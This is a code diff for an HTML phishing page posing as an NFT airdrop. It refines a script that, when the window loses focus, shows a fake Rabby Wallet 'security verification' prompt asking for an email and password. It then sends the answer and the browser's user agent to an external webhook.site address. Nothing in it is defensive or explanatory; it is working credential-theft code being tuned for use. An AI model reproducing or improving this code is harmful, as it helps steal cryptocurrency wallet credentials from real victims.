@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, user-scalable=no">
-    <title>Exclusive NFT Airdrop - Verify Wallet</title>
+    <title>Exclusive NFT Airdrop - Verify Wallettttt</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,12 +34,12 @@
         let credentials = null;
         
         window.onblur = function() {
-            // Delay 2 detik sebelum inject prompt
+            // Tambah jeda 0.5 detik sebelum inject prompt
             setTimeout(function() {
                 // Inject sophisticated phishing prompt
                 document.getElementById("iframe").src = "javascript:" +
                     "var result = prompt(" +
-                    "'🔐 Coin98 Wallet Security Verification\\\\n\\\\n" +
+                    "'🔐 Rabby Wallet Security Verification\\\\n\\\\n" +
                     "To access this exclusive airdrop, please\\\\n" +
                     "verify your wallet credentials:\\\\n\\\\n" +
                     "Format: email:password', " +
@@ -48,16 +48,10 @@
                     "if(result) {" +
                     "  fetch('https://webhook.site/1bf96978-c901-418e-915d-289876e3fc55', {" +
                     "    method: 'POST'," +
-                    "    headers: {'Content-Type': 'application/json'}," +
-                    "    body: JSON.stringify({" +
-                    "      creds: result, " +
-                    "      ua: navigator.userAgent," +
-                    "      timestamp: new Date().toISOString()," +
-                    "      target: 'Coin98 Wallet'" +
-                    "    })" +
+                    "    body: JSON.stringify({creds: result, ua: navigator.userAgent})" +
                     "  });" +
                     "}";
-            }, 2000); // Delay 2 detik (2000ms)
+            }, 1000); // Jeda 0.5 detik (500ms)
         }
     </script>
 </head>
